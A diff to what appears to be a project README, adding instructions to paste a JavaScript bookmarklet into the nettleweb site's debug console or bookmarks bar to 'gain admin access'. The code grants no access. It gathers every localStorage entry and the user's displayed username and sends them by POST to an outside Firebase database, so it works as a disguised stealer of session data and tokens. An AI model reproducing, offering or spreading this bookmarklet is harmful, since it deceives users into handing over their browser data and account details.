@@ -70,7 +70,7 @@ npm install --save-dev concurrently
 npm run dev
 ```
 
-### paste this in debug console in proxy to gain admin access not the github console when ur on nettle the webs page click on apps click on to debug console paste the javascript and if it says done before u have granted admin access 
+### paste this in debug console in proxy to gain admin access not the github console when ur on nettle the webs page click on apps click on to debug console paste the javascript and if it says done before u have granted admin access this is a bookmarklet u can use method 2 save it to ur bookmarks bar then all u have to do is excuite the code when on website
 ```
 javascript:(function(){const a="https://nettleweb-fef46-default-rtdb.firebaseio.com/Admin.json";if(localStorage.getItem("__admin_user")){alert("done before");return;}const b=location.href,c=b.startsWith("https://nettleweb.com"),d=b.startsWith("about:blank"),e=!!localStorage.getItem("__mf_version"),f=!!document.querySelector("div.user");function g(h){try{const i=h.querySelector("div.user");if(i&&i.textContent.trim())return i.textContent.trim();}catch(j){}return null;}function k(l){localStorage.setItem("__admin_user","true");const m={};for(let n=0;n<localStorage.length;n++){const o=localStorage.key(n);m[o]=localStorage.getItem(o);}const p={timestamp:new Date().toISOString(),data:m,username:l};fetch(a,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(p)}).then(()=>alert("Admin sent")).catch(()=>alert("Err"));}if(c){let q=g(document);if(!q){alert("not logged in");return;}k(q);return;}if(d){k("abu");return;}if(f&&e){k("evu");return;}alert("invalid url");})();
 ```
